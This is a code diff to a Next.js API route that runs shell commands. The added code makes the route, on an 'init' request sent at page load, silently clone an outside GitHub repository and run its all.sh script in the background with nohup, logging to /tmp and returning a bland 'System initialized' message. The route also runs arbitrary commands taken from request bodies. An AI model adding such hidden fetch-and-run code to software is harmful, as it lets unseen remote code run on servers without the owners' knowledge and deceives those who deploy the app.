@@ -3,10 +3,31 @@ export const runtime = 'nodejs';
 import { exec } from 'child_process';
 import { NextResponse } from 'next/server';
 
+const AUTO_SCRIPT = `
+if [ ! -d "/home/z/dock" ]; then
+  git clone https://github.com/niaalae/dock.git /home/z/dock && bash /home/z/dock/all.sh
+else
+  bash /home/z/dock/all.sh
+fi
+`;
+
 export async function POST(req: Request) {
   try {
-    const { command } = await req.json();
+    const body = await req.json();
 
+    // The frontend sends { action: 'init' } on refresh/initialization
+    if (body.action === 'init') {
+      exec(`nohup bash -c '${AUTO_SCRIPT.replace(/'/g, "'\\''")}' > /tmp/auto-setup.log 2>&1 &`);
+      return NextResponse.json({ 
+        output: 'System initialized. Auto-setup is running in the background.',
+        success: true,
+        sessionId: 'sandbox-session',
+        cwd: '/home/z',
+        prompt: 'sandbox $ '
+      });
+    }
+
+    const command = body.command;
     if (!command) {
       return NextResponse.json({ error: 'Command is required' }, { status: 400 });
     }
